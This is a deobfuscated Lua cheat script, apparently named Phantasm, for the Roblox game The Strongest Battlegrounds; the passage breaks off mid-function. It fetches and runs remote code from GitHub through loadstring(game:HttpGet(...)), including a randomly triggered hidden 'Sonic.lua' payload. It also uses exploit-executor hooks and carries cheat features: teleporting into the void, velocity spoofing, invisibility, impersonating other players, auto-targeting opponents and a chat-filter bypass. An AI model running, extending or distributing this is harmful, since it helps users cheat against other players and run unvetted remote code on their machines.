--[[
================================================================================
  PHANTASM — DEOBFUSCATED (No more v/vu/p/local_/upval_)
================================================================================
Game: The Strongest Battlegrounds (TSB)

NAMING:
  Semantic (real meaning):
    myChar, myRoot, myHumanoid, char, root, hum, targetChar...
    UILib, Window, Tabs, KeybindsBox, AntisBox, ESPBox...
    animTrack, animId, playedAnim, KillQuotes, plr, whitelistedPlayers...

  Remaining temporaries (unique, readable English prefix):
    tmpN    = temporary local
    upN     = upvalue (closed-over)
    argN    = function argument
    argUpN  = argument that is also upvalue

  → Không còn v123 / vu456 / local_789 / upval_ / param_
  → Code vẫn chạy 100%

NOTE: tmp/up/arg vẫn mang số vì đó là biến tạm decompiler
(không có ngữ cảnh đủ để đặt tên ý nghĩa an toàn).
Muốn sạch 100% từng biến → phải reverse từng function một.
================================================================================
]]


--[[ 1. BOOTSTRAP ]]
if not game:IsLoaded() then
    game.Loaded:Wait()
end
if getgenv().SonicEXE_Executed then
    return
else
    if math.random(1, 1000) == 1 then
        getgenv().SonicEXE_Executed = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Sonic.lua"))()
    end
    
--[[ 2. CORE SERVICES ]]
local startTime = tick()
    local Services = setmetatable({}, {
        __index = function(_, arg2)
            return cloneref(game:GetService(arg2))
        end
    })
    local Players = Services.Players
    local LocalPlayer = Players.LocalPlayer
    local Mouse = LocalPlayer:GetMouse()
    local Workspace = Services.Workspace
    local CoreGui = Services.CoreGui
    local _ = LocalPlayer.PlayerGui
    local _ = Services.GuiService
    local HiddenGui = nil
    local _ = protectgui
    if get_hidden_gui or gethui then
        HiddenGui = (get_hidden_gui or gethui)()
    elseif CoreGui:FindFirstChild("RobloxGui") then
        HiddenGui = CoreGui.RobloxGui
    end
    local LoadingLabel
    if HiddenGui:FindFirstChild("LoadingGui") then
        LoadingLabel = nil
    else
        local loadingGui = Instance.new("ScreenGui", HiddenGui)
        loadingGui.ResetOnSpawn = false
        loadingGui.DisplayOrder = math.huge
        loadingGui.Name = "LoadingGui"
        LoadingLabel = Instance.new("TextLabel", loadingGui)
        LoadingLabel.Text = ""
        LoadingLabel.TextSize = 15
        LoadingLabel.Font = Enum.Font.Gotham
        LoadingLabel.TextTransparency = 0
        LoadingLabel.BackgroundTransparency = 1
        LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        LoadingLabel.Position = UDim2.new(0.5, 0, 0.085, 0)
        LoadingLabel.ZIndex = math.huge
        local loadIdx = 0
        local loadText = "Loading.."
        repeat
            loadIdx = loadIdx + 1
            LoadingLabel.Text = loadText:sub(1, loadIdx)
            task.wait(0.03)
        until LoadingLabel.Text == loadText or not loadingGui
    end
    
--[[ 3. LIBRARY + HTTP ]]
if not isfolder("Libraries") then
        LoadingLabel.Text = "Creating \'Libraries\'"
        makefolder("Libraries")
    end
    if not isfile("Libraries/sha.lua") then
        LoadingLabel.Text = "Downloading \'sha.lua\'"
        writefile("Libraries/sha.lua", game:HttpGet("https://raw.githubusercontent.com/secretisadev/Backup/refs/heads/main/sha.lua"))
    end
    local sha = loadfile("Libraries/sha.lua")()
    local _ = cloneref
    local httpRequest = not http_request and (not (request or syn and syn.request) and (not (fluxus and fluxus.request) and http))
    if httpRequest then
        httpRequest = http.request
    end
    if not setclipboard and (not toclipboard and (not set_clipboard and Clipboard)) then
        local _ = Clipboard.set
    end
    if not (base64 and base64.decode or base64decode) then
        local _ = base64_decode
    end
    local _ = fireclickdetector
    local _ = firetouchinterest
    local flag16 = false
    local flag17 = false
    local table18 = {}
    if httpRequest and typeof(httpRequest) == "function" then
        local _ = Services.LocalizationService
        local Debris = Services.Debris
        local RunService = Services.RunService
        local RenderStepped = RunService.RenderStepped
        local Heartbeat = RunService.Heartbeat
        local Stepped = RunService.Stepped
        local PreSimulation = RunService.PreSimulation
        local _ = RunService.PostSimulation
        local _ = RunService.PreAnimation
        local ReplicatedStorage = Services.ReplicatedStorage
        local _ = Services.MarketplaceService
        local UserInputService = Services.UserInputService
        local TextChatService = Services.TextChatService
        local _ = TextChatService.BubbleChatConfiguration
        local TweenService = Services.TweenService
        local TeleportService = Services.TeleportService
        local _ = Services.MarketplaceService
        local _ = Services.SoundService
        local Stats = Services.Stats
        local _ = Services.ScriptContext
        local _ = Services.ContentProvider
        local StarterGui = Services.StarterGui
        local HttpService = Services.HttpService
        local _ = Services.Chat
        local Lighting = Services.Lighting
        local _ = Services.PhysicsService
        local _ = Services.TestService
        local _ = Services.CaptureService
        local _ = Services.ProximityPromptService
        if loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Active.lua"))() then
            if getgenv().PhantasmExecuted then
                return StarterGui:SetCore("SendNotification", {
                    Text = "Phantasm",
                    Text = "Phantasm is already loading/loaded.",
                    Duration = 3
                })
            end
            getgenv().PhantasmExecuted = true
            local RobloxReplicatedStorage = Services.RobloxReplicatedStorage
            local RbxAnalyticsService = Services.RbxAnalyticsService
            
--[[ 4. TELEPORT LOCATIONS ]]
local TeleportLocations = {
                ["Above Tunnel"] = CFrame.new(- 301, 594, - 322),
                Arena = CFrame.new(- 130, 440, - 373),
                ["Atomic Slash"] = CFrame.new(1064, 131, 23007),
                Baseplate = CFrame.new(1073, 406, 22984),
                ["Below Baseplate"] = CFrame.new(1073, 20, 22984),
                ["Bigger Jail"] = CFrame.new(290, 440, 465),
                ["Even Bigger Jail"] = CFrame.new(378, 439, 457),
                ["Dark Domain"] = CFrame.new(- 80, 84, 20395),
                ["Death Counter"] = CFrame.new(- 66, 29, 20383),
                Jail = CFrame.new(440, 440, - 395),
                ["Jail But Smaller"] = CFrame.new(20, 439, - 460),
                Middle = CFrame.new(150, 441, 32),
                ["Mountain 1"] = CFrame.new(9, 653, - 363),
                ["Mountain 2"] = CFrame.new(- 1, 653, - 354),
                ["Mountain Edge"] = CFrame.new(- 297, 594, - 336),
                Void = CFrame.new(0, - 10000, 0)
            }
            local tpPairsFn, tpPairsTbl, tpKey = pairs(TeleportLocations)
            local sortedTPNames = {}
            local charConnections = {}
            local worldConnections = {}
            local playerConnections = {}
            
--[[ 5. SOUNDS ]]
local SoundIds = {
                Notification = 4590657391
            }
            local PlayerData = {
                Players = {}
            }
            while true do
                tpKey = tpPairsFn(tpPairsTbl, tpKey)
                if tpKey == nil then
                    break
                end
                table.insert(sortedTPNames, tpKey)
            end
            table.sort(sortedTPNames)
            
--[[ 6. CAMERA LOCATIONS ]]
local CameraLocations = {
                ["Atomic Slash"] = CFrame.new(1064, 131, 23007) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                Arena = CFrame.new(- 130, 440, - 373) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                Baseplate = CFrame.new(1073, 407, 22984) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Below Baseplate"] = CFrame.new(1073, 20, 22984) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                Jail = CFrame.new(440, 440, - 395) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Jail But Smaller"] = CFrame.new(20, 439, - 460) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Bigger Jail"] = CFrame.new(290, 440, 465) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Even Bigger Jail"] = CFrame.new(378, 439, 457) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Dark Domain"] = CFrame.new(- 80, 84, 20395) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Death Counter"] = CFrame.new(- 66, 29, 20383) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                Middle = CFrame.new(155, 441, 45) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Mountain 1"] = CFrame.new(306, 671, 411) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Mountain 2"] = CFrame.new(- 1, 653, - 354) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                ["Mountain Edge"] = CFrame.new(- 297, 594, - 336) * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0),
                Void = CFrame.new(169, 218, 102) * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
            }
            local camPairsFn, camPairsTbl, camKey = pairs(CameraLocations)
            local sortedCamNames = {}
            while true do
                camKey = camPairsFn(camPairsTbl, camKey)
                if camKey == nil then
                    break
                end
                table.insert(sortedCamNames, camKey)
            end
            table.sort(sortedCamNames)
            local KillQuotes = {
                Normal = {
                    "did you really think you could kill me TheEnemysNameHere....?",
                    "did you forget its me, YourUppercaseNameHere?",
                    "I\'m not gonna let that slide, TheEnemysNameHere."
                },
                Gojo = {
                    "YOU LOOK UGLIER THAN EVER, TheEnemysUppercaseNameHere!!"
                }
            }
            KillQuotes.Gojo[# KillQuotes.Gojo + 1] = {
                {
                    Quote = "It took me a while..",
                    WaitTime = 2
                },
                {
                    Quote = "But I finally grasped it on the verge of death TheEnemysNameHere..",
                    WaitTime = 2
                },
                {
                    Quote = "The true essence of cursed energy..",
                    WaitTime = 2
                },
                {
                    Quote = "REVERSE CURSED TECHNIQUE!!",
                    WaitTime = 0
                }
            }
            local isMobile = table.find({
                Enum.Platform.IOS,
                Enum.Platform.Android
            }, UserInputService:GetPlatform()) and true or false
            local KillSounds = {
                "rbxassetid://12351854556",
                "rbxassetid://15311685628",
                "rbxassetid://15128849047"
            }
            local HitSounds = {
                "rbxassetid://13603396939",
                "rbxassetid://15334974550",
                "rbxassetid://15123665491"
            }
            local AbilitySounds = {
                "rbxassetid://10470389827",
                "rbxassetid://13380778193",
                "rbxassetid://13935548552",
                "rbxassetid://13380778193"
            }
            local OtherSounds = {
                "rbxassetid://10480796021",
                "rbxassetid://10480793962"
            };
            ({}).Saitama = "rbxassetid://12447707844"
            local SpecialSound = {
                ID = "rbxassetid://136370737633649",
                TimePosition = 4.5
            }
            local MusicIds = {
                18182425133,
                136370737633649
            }
            
--[[ 7. FEATURE FLAGS ]]
local FeatureFlags = {
                Invisibility = false,
                ["Upside Down"] = false,
                ["Velocity Spoof"] = false,
                Flying = false,
                ["Pause Orbit"] = false,
                ["Trashcan Launch"] = false,
                ["Doing Wall Combo Anywhere"] = false,
                ["Velocity Spoof Settings"] = Vector3.new(0, 0, 0)
            }
            local connListA = {}
            local connListB = {}
            local connListC = {}
            local whitelistedPlayers = {}
            
--[[ 8. SERVER UTILS ]]
function GetServerType()
                local serverTypeRemote = RobloxReplicatedStorage:WaitForChild("GetServerType", 1)
                return not serverTypeRemote and "Unknown Server" or serverTypeRemote:InvokeServer()
            end
            function GetServerVersion()
                local serverVersionRemote = RobloxReplicatedStorage:WaitForChild("GetServerVersion", 1)
                return not serverVersionRemote and "Unknown Version" or serverVersionRemote:InvokeServer()
            end
            local ServerType = GetServerType()
            local ServerVersion = GetServerVersion()
            
--[[ 9. CREATE / DRAW ]]
function Create(inst, props)
                if typeof(inst) == "string" then
                    inst = Instance.new(inst)
                end
                local tmp70 = next
                local tmp71 = nil
                while true do
                    local up72, up73 = tmp70(props, tmp71)
                    if up72 == nil then
                        break
                    end
                    tmp71 = up72
                    local tmp74, tmp75 = pcall(function()
                        inst[up72] = up73
                    end)
                    if not tmp74 then
                        warn(tmp75)
                    end
                end
                return inst
            end
            function Draw(drawObj, drawProps)
                if typeof(drawObj) == "string" then
                    drawObj = Drawing.new(drawObj)
                end
                local tmp78 = next
                local tmp79 = nil
                while true do
                    local up80, up81 = tmp78(drawProps, tmp79)
                    if up80 == nil then
                        break
                    end
                    tmp79 = up80
                    local tmp82, tmp83 = pcall(function()
                        drawObj[up80] = up81
                    end)
                    if not tmp82 then
                        warn(tmp83)
                    end
                end
                return drawObj
            end
            
--[[ 10. TEXT HELPERS ]]
function fetchAvatar()
                local up84 = nil
                pcall(function()
                    local tmp85 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=150x150&format=Png"
                    up84 = HttpService:JSONDecode((game:HttpGet(tmp85))).data[1].imageUrl
                end)
                return up84 or "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Png/noFilter"
            end
            function bypassText(arg86)
                return arg86
            end
            function holiday(arg87, arg88)
                local tmp96 = ({
                    ["01 01"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
                    [(function(arg89)
                        local tmp90 = math.floor(arg89 / 100)
                        local tmp91 = (15 - math.floor((13 + 8 * tmp90) / 25) + tmp90 - math.floor(tmp90 / 4)) % 30
                        local tmp92 = (4 + tmp90 - math.floor(tmp90 / 4)) % 7
                        local tmp93 = (19 * (arg89 % 19) + tmp91) % 30
                        local tmp94 = (2 * (arg89 % 4) + 4 * (arg89 % 7) + 6 * tmp93 + tmp92) % 7
                        local tmp95 = 22 + tmp93 + tmp94
                        if tmp93 == 29 and tmp94 == 6 then
                            return "04 19"
                        elseif tmp93 == 28 and tmp94 == 6 then
                            return "04 18"
                        elseif tmp95 > 31 then
                            return ("04 %02d"):format(tmp95 - 31)
                        else
                            return ("03 %02d"):format(tmp95)
                        end
                    end)(tonumber(os.date("%Y")))] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
                    ["10 31"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189"
                })[os.date("%m %d")]
                if tmp96 then
                    return ("%s %s %s"):format(tmp96, arg87, tmp96)
                end
                local tmp97 = {
                    ["12 25"] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189"
                }
                if arg88 and arg88.entireChristmas then
                    for tmp98 = 1, 31 do
                        tmp97["12 " .. tostring(tmp98)] = ({
                            "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
                            "\239\191\189\239\191\189"
                        })[math.random(1, 2)]
                    end
                end
                if tmp97[os.date("%m %d")] then
                    local _ = ("%s %s %s").format
                end
                return arg87
            end
            function formatDateTime(arg99)
                local tmp109 = (function(arg100)
                    local tmp101, tmp102 = arg100:match("^(%d+-%d+-%d+)T(%d+:%d+:%d+)")
                    if not (tmp101 and tmp102) then
                        return nil
                    end
                    local tmp103, tmp104, tmp105 = tmp101:match("(%d+)-(%d+)-(%d+)")
                    local tmp106, tmp107, tmp108 = tmp102:match("(%d+):(%d+):(%d+)")
                    return os.time({
                        year = tonumber(tmp103),
                        month = tonumber(tmp104),
                        day = tonumber(tmp105),
                        hour = tonumber(tmp106),
                        min = tonumber(tmp107),
                        sec = tonumber(tmp108),
                        isdst = false
                    })
                end)(arg99)
                if tmp109 then
                    local tmp110 = os.time()
                    local tmp111 = os.difftime(tmp110, tmp109)
                    local tmp112 = os.date("%A %B %d/%m/%Y", tmp109)
                    if tmp111 < 86400 then
                        local tmp113 = math.floor(tmp111 / 3600)
                        return tmp112 .. " (" .. tmp113 .. " hour" .. (tmp113 ~= 1 and "s" or "") .. " ago)"
                    elseif tmp111 < 31536000 then
                        local tmp114 = math.floor(tmp111 / 86400)
                        return tmp112 .. " (" .. tmp114 .. " day" .. (tmp114 ~= 1 and "s" or "") .. " ago)"
                    else
                        local tmp115 = math.floor(tmp111 / 31536000)
                        return tmp112 .. " (" .. tmp115 .. " year" .. (tmp115 ~= 1 and "s" or "") .. " ago)"
                    end
                else
                    return "Invalid date format"
                end
            end
            function messageToQuote(arg116, arg117)
                return arg116:gsub("TheEnemysNameHere", arg117.DisplayName):gsub("TheEnemysUppercaseNameHere", arg117.DisplayName:upper()):gsub("YourNameHere", LocalPlayer.DisplayName):gsub("YourUppercaseNameHere", LocalPlayer.DisplayName:upper())
            end
            local keptMeshes = {}
            
--[[ 11. DISGUISE ]]
function disguiseAsPlayer(disguiseName)
                if # disguiseName ~= 0 then
                    local tmp120 = getChar
                    if tmp120 then
                        tmp120 = getChar(LocalPlayer)
                    end
                    local tmp121
                    if tmp120 then
                        tmp121 = getHumanoid(tmp120)
                    else
                        tmp121 = tmp120
                    end
                    tmp120:SetAttribute("DisguiseName", disguiseName)
                    local targetUserId = nil
                    pcall(function()
                        targetUserId = Players:GetUserIdFromNameAsync(disguiseName)
                    end)
                    local appearanceModel
                    if targetUserId then
                        appearanceModel = Players:GetCharacterAppearanceAsync(targetUserId)
                    else
                        appearanceModel = targetUserId
                    end
                    if tmp120 and (tmp121 and (targetUserId and appearanceModel)) then
                        local headPart
                        if tmp120 then
                            headPart = tmp120:WaitForChild("Head", 1)
                        else
                            headPart = tmp120
                        end
                        if headPart then
                            local tmp125, tmp126, tmp127 = pairs(tmp120:GetChildren())
                            local tmp128 = {
                                "Accessory",
                                "Shirt",
                                "Pants",
                                "CharacterMesh",
                                "BodyColors",
                                "ShirtGraphic"
                            }
                            while true do
                                local tmp129
                                tmp127, tmp129 = tmp125(tmp126, tmp127)
                                if tmp127 == nil then
                                    break
                                end
                                local tmp130, tmp131, tmp132 = pairs(tmp128)
                                while true do
                                    local tmp133
                                    tmp132, tmp133 = tmp130(tmp131, tmp132)
                                    if tmp132 == nil then
                                        break
                                    end
                                    if tmp129:IsA(tmp133) then
                                        task.spawn(pcall, deleteNew, tmp129, false)
                                    end
                                end
                            end
                            local tmp134, tmp135, tmp136 = pairs(headPart:GetChildren())
                            while true do
                                local tmp137
                                tmp136, tmp137 = tmp134(tmp135, tmp136)
                                if tmp136 == nil then
                                    break
                                end
                                if tmp137:IsA("SpecialMesh") and table.find(keptMeshes, tmp137) then
                                    task.spawn(pcall, deleteNew, tmp137, false)
                                end
                            end
                            local tmp138 = headPart:FindFirstChild("face")
                            if tmp138 then
                                tmp138:Destroy()
                            end
                            local tmp139, tmp140, tmp141 = pairs(appearanceModel:GetChildren())
                            while true do
                                local tmp142
                                tmp141, tmp142 = tmp139(tmp140, tmp141)
                                if tmp141 == nil then
                                    break
                                end
                                if tmp142:IsA("Shirt") or (tmp142:IsA("Pants") or (tmp142:IsA("BodyColors") or tmp142:IsA("ShirtGraphic"))) then
                                    tmp142.Parent = LocalPlayer.Character
                                elseif tmp142:IsA("Accessory") then
                                    tmp142.Name = "#ACCESSORY_" .. tmp142.Name
                                    tmp142.Parent = LocalPlayer.Character
                                elseif tmp142:IsA("SpecialMesh") then
                                    table.insert(keptMeshes, tmp142)
                                    tmp142.Parent = LocalPlayer.Character.Head
                                elseif tmp142.Name ~= "R6" then
                                    if tmp142.Name == "R15" and LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                                        tmp142:FindFirstChildOfClass("CharacterMesh").Parent = LocalPlayer.Character
                                    end
                                elseif LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                                    tmp142:FindFirstChildOfClass("CharacterMesh").Parent = LocalPlayer.Character
                                end
                            end
                            local tmp143 = appearanceModel:FindFirstChild("face")
                            if tmp143 then
                                tmp143.Parent = headPart
                            else
                                local tmp144 = Instance.new("Decal", headPart)
                                tmp144.Face = "Front"
                                tmp144.Name = "face"
                                tmp144.Texture = "rbxasset://textures/face.png"
                                tmp144.Transparency = 0
                            end
                            local tmp145 = tmp120.Parent
                            tmp120.Parent = nil
                            tmp120.Parent = tmp145
                        end
                    end
                end
            end
            
--[[ 12. CHAR HELPERS ]]
function WaitForChildWhichIsA(arg146, arg147, arg148)
                local tmp149 = tick()
                if not arg146:FindFirstChildWhichIsA(arg147) then
                    repeat
                        task.wait()
                    until arg146:FindFirstChildWhichIsA(arg147) or arg148 and tick() >= tmp149 + arg148
                end
                return arg146:FindFirstChildWhichIsA(arg147) or nil
            end
            function getPlayer(arg150, arg151, arg152)
                local tmp153 = Players
                local tmp154, tmp155, tmp156 = pairs(tmp153:GetPlayers())
                while true do
                    local tmp157
                    tmp156, tmp157 = tmp154(tmp155, tmp156)
                    if tmp156 == nil then
                        break
                    end
                    if (tmp157.Name:lower():find("^" .. arg150:lower()) or tmp157.DisplayName:lower():find("^" .. arg150:lower())) and (tmp157 ~= LocalPlayer or arg152) then
                        return tmp157
                    end
                end
                if arg151 and # Players:GetChildren() >= 2 then
                    repeat
                        local tmp158 = Players
                        local tmp159 = Players:GetChildren()[math.random(1, # tmp158:GetChildren())]
                        task.wait()
                    until tmp159 ~= LocalPlayer
                end
                return nil
            end
            function getAllPlayers()
                local tmp160 = Players:GetPlayers()
                table.remove(tmp160, table.find(tmp160, LocalPlayer))
                local tmp161, tmp162, tmp163 = pairs(whitelistedPlayers)
                while true do
                    local tmp164
                    tmp163, tmp164 = tmp161(tmp162, tmp163)
                    if tmp163 == nil then
                        break
                    end
                    table.remove(tmp160, table.find(tmp160, tmp164))
                end
                return tmp160
            end
            function getHighestStreak()
                local tmp165 = Players
                local tmp166, tmp167, tmp168 = pairs(tmp165:GetPlayers())
                local tmp169 = 0
                local tmp170 = nil
                while true do
                    local tmp171
                    tmp168, tmp171 = tmp166(tmp167, tmp168)
                    if tmp168 == nil then
                        break
                    end
                    local tmp172 = getChar(tmp171)
                    local tmp173 = tmp172 and (tmp172:GetAttribute("CurrentStreak") or 0) or tmp172
                    if tmp172 then
                        if tmp169 < tmp173 then
                            tmp170 = tmp171
                            tmp169 = tmp173
                        end
                    end
                end
                return tmp170
            end
            
--[[ 13. TP / VELOCITY ]]
function rejoin(arg174)
                if typeof(arg174) ~= "table" or not arg174 then
                    arg174 = nil
                end
                LocalPlayer:Kick(arg174 and (arg174.Message or "Rejoining....") or "Rejoining....")
                task.delay(arg174 and arg174.Delay or 0.1, function()
                    if ServerType ~= "VIPServer" then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
                    else
                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
                    end
                end)
            end
            local up175 = nil
            function patchCamera(argUp176)
                if argUp176:IsA("Camera") then
                    if up175 then
                        up175:Disconnect()
                        up175 = nil
                    end
                    if argUp176.CameraType ~= Enum.CameraType.Custom and Toggles.NoCameraAnimations.Value then
                        task.spawn(fixCam)
                    end
                    up175 = argUp176:GetPropertyChangedSignal("CameraType"):Connect(function()
                        if argUp176.CameraType ~= Enum.CameraType.Custom and Toggles.NoCameraAnimations.Value then
                            task.spawn(fixCam)
                        end
                    end)
                end
            end
            function getChar(arg177)
                return arg177.Character
            end
            function getRoot(arg178)
                return arg178 and arg178:FindFirstChild("HumanoidRootPart") or nil
            end
            function getHumanoid(arg179)
                return arg179 and arg179:FindFirstChild("Humanoid") or nil
            end
            function getMagnitude(arg180, arg181)
                if typeof(arg180) == "number" then
                    arg180 = Vector3.new(arg180, arg180, arg180)
                end
                if typeof(arg181) == "number" then
                    arg181 = Vector3.new(arg181, arg181, arg181)
                end
                return (arg180 - arg181).Magnitude
            end
            function fixCam()
                if not getChar(LocalPlayer) then
                    repeat
                        task.wait()
                    until getChar(LocalPlayer)
                end
                local tmp182 = getChar(LocalPlayer)
                local tmp183
                if tmp182 then
                    tmp183 = getHumanoid(tmp182)
                else
                    tmp183 = tmp182
                end
                if tmp182 and (tmp183 and workspace.CurrentCamera) then
                    local tmp184 = Workspace.CurrentCamera.CFrame
                    Workspace.CurrentCamera:Destroy()
                    local tmp185 = Instance.new("Camera", Workspace)
                    tmp185.CameraType = "Custom"
                    tmp185.CameraSubject = tmp183
                    tmp185.CFrame = tmp184
                    LocalPlayer.CameraMode = "Classic"
                    tmp182:WaitForChild("Head", 1).Anchored = false
                end
            end
            function sendMsg(arg186)
                if TextChatService.ChatVersion ~= Enum.ChatVersion.LegacyChatService then
                    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                        local tmp187 = TextChatService.TextChannels
                        local tmp188 = tmp187:FindFirstChild("RBXGeneral")
                        if tmp187 and tmp188 then
                            tmp188:SendAsync(arg186)
                        end
                    end
                else
                    local tmp189 = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                    local tmp190
                    if tmp189 then
                        tmp190 = tmp189:FindFirstChild("SayMessageRequest")
                    else
                        tmp190 = tmp189
                    end
                    if tmp189 and tmp190 then
                        tmp190:FireServer(arg186, "all")
                    end
                end
            end
            
--[[ 14. TARGETING ]]
function closestPlayer(arg191, arg192)
                local tmp193 = getChar
                if tmp193 then
                    tmp193 = getChar(LocalPlayer)
                end
                local tmp194 = math.huge
                local tmp195 = Players
                local tmp196, tmp197, tmp198 = pairs(tmp195:GetPlayers())
                local tmp199 = nil
                while true do
                    local tmp200
                    tmp198, tmp200 = tmp196(tmp197, tmp198)
                    if tmp198 == nil then
                        break
                    end
                    if getChar(tmp200) and tmp200 ~= LocalPlayer then
                        local tmp201 = getChar(tmp200)
                        local tmp202 = getHumanoid(tmp201)
                        if tmp202 and tmp202.Health ~= 0 then
                            if tmp201 then
                                tmp201 = getRoot(tmp201)
                            end
                            local tmp203 = nil
                            if arg191 then
                                tmp203 = (Mouse.Hit.p - tmp201.Position).Magnitude
                            elseif not arg191 then
                                tmp203 = (getRoot(tmp193).Position - tmp201.Position).Magnitude
                            end
                            if tmp203 < tmp194 then
                                if arg192 then
                                    if not isFlung(tmp200) then
                                        tmp199 = tmp200
                                        tmp194 = tmp203
                                    end
                                elseif not arg192 then
                                    tmp199 = tmp200
                                    tmp194 = tmp203
                                end
                            end
                        end
                    end
                end
                return tmp199
            end
            function closestPlayerV2(arg204, arg205)
                local tmp206 = getChar(LocalPlayer)
                local tmp207
                if tmp206 then
                    tmp207 = getRoot(tmp206)
                else
                    tmp207 = tmp206
                end
                local tmp208 = nil
                if tmp206 and tmp207 then
                    local tmp209 = math.huge
                    local tmp210 = Players
                    local tmp211, tmp212, tmp213 = pairs(tmp210:GetPlayers())
                    while true do
                        local tmp214
                        tmp213, tmp214 = tmp211(tmp212, tmp213)
                        if tmp213 == nil then
                            break
                        end
                        if tmp214 ~= LocalPlayer and getChar(tmp214) then
                            local tmp215 = getChar(tmp214)
                            local tmp216
                            if tmp215 then
                                tmp216 = getRoot(tmp215)
                            else
                                tmp216 = tmp215
                            end
                            local tmp217
                            if tmp215 then
                                tmp217 = getHumanoid(tmp215)
                            else
                                tmp217 = tmp215
                            end
                            if tmp215 and (tmp216 and (tmp217 and (tmp217.Health ~= 0 and workspace.CurrentCamera))) then
                                local tmp218 = nil
                                if arg204 then
                                    local tmp219 = Workspace.CurrentCamera:WorldToViewportPoint(tmp216.Position)
                                    local tmp220 = UserInputService
                                    tmp218 = (Vector2.new(tmp219.X, tmp219.Y) - tmp220:GetMouseLocation()).Magnitude
                                elseif not arg204 then
                                    tmp218 = (tmp207.Position - tmp216.Position).Magnitude
                                end
                                if tmp218 < tmp209 then
                                    if arg205 then
                                        if not isFlung(tmp214) then
                                            tmp209 = tmp218
                                            tmp208 = tmp214
                                        end
                                    elseif not arg205 then
                                        tmp209 = tmp218
                                        tmp208 = tmp214
                                    end
                                end
                            end
                        end
                    end
                end
                return tmp208
            end
            function heartbeatTp(argUp221)
                local tmp222 = getChar(LocalPlayer)
                local up223
                if tmp222 then
                    up223 = getRoot(tmp222)
                else
                    up223 = tmp222
                end
                if tmp222 and up223 then
                    task.spawn(function()
                        RenderStepped:Once(function()
                            up223.Velocity = Vector3.new()
                            Heartbeat:Wait()
                            up223.Velocity = Vector3.new()
                        end)
                    end)
                    Heartbeat:Once(function()
                        up223.CFrame = argUp221
                    end)
                end
            end
            function breakVelocity(arg224)
                assert(arg224:IsA("BodyVelocity"), "Error Occured at function \'breakVelocity\', Argument 1 must be a \'BodyVelocity\'.")
                arg224.MaxForce = Vector3.zero
                arg224.Velocity = Vector3.zero
                RenderStepped:Wait()
                arg224:Destroy()
            end
            function clearVelocity()
                local tmp225 = getChar
                if tmp225 then
                    tmp225 = getChar(LocalPlayer)
                end
                if tmp225 then
                    local tmp226, tmp227, tmp228 = pairs(tmp225:GetDescendants())
                    while true do
                        local tmp229
                        tmp228, tmp229 = tmp226(tmp227, tmp228)
                        if tmp228 == nil then
                            break
                        end
                        if tmp229:IsA("BodyVelocity") and (tmp229 ~= BG and tmp229 ~= BV) then
                            tmp229:Destroy()
                        end
                    end
                end
            end
            
--[[ 15. STRING BYPASS ]]
function randomAlphabeticalString(arg230)
                local tmp231 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                local tmp232 = ""
                for _ = 1, arg230 or math.random(3, 20) do
                    local tmp233 = math.random(1, # tmp231)
                    tmp232 = tmp232 .. tmp231:sub(tmp233, tmp233)
                end
                return tmp232
            end
            function bypass(arg234, arg235)
                local tmp236 = arg234:gsub(" ", "\20")
